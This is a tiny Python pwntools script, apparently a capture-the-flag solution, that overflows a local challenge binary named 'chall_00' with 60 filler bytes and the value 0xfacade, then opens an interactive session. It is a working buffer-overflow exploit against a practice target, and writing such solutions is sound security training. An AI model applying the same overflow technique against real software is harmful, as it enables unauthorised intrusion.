# coding: utf-8
from pwn import *
p=process("./chall_00")
p.sendline((0x40-0x4)*b"A"+p32(0xfacade))
p.interactive()
